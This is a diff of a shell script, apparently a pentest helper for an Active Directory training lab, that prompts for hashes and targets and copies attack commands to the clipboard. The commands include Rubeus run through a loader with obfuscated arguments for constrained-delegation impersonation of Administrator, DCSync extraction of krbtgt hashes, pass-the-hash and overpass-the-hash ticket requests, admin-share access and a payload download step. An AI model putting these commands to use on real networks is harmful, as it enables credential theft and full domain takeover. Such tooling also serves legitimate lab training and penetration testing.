@@ -352,7 +352,7 @@ nb-ad-pwsh-constrained-machine() {
     __ask "Enter the msds-allowedtodelegateto ex. TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL"
     local value && __askvar value VALUE
 
-    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:${__USER} /aes256:${__HASH} /impersonateuser:Administrator /msdsspn:\"$value\" /altservice:ldap /ptt"
+    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:${__USER} /aes256:${__HASH} /impersonateuser:Administrator /msdsspn:$value /altservice:ldap /ptt"
 
     echo "$__COMMAND" | wl-copy
     echo
@@ -392,7 +392,7 @@ nb-ad-pwsh-constrained-user() {
     __ok "klist"
     echo
     __info "Try accessing filesystem on $value:"
-    __ok "dir \\\\\\$value\\c\$"
+    __ok "dir \\\\\\$value\\\\c\$"
 }
 
 nb-ad-pwsh-unconstrained() {
@@ -540,8 +540,11 @@ nb-ad-pwsh-dcsync() {
 
     echo "$__COMMAND" | wl-copy
     echo
-    __info "Command to run DCSync copied to clipboard:"
+    __info "To dump all users, use flag /all, to specify a list of users use: /user:user1 /user:user2"
+    echo
+    __info "Command to run DCSync and extract krbtgt's hashes copied to clipboard:"
     __ok "$__COMMAND"
+    echo
 }
 
 nb-ad-pwsh-pth() {
@@ -571,6 +574,7 @@ nb-ad-pwsh-opth() {
     __ask "Enter AES256 version of the hash"
     __check-hash
 
+    echo
     __warn "First encode the following command with: .\\ArgSplit.bat:"
     __ok "asktgt"
     echo
@@ -832,9 +836,8 @@ nb-ad-pwsh-file-download() {
     esac
 
     echo "$__COMMAND" | wl-copy
-
-    __info "Run the shell using command:"
-    __ok "  Start-Process \"shell-name.exe\""
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
 }
 
 nb-ad-pwsh-psremoting() {
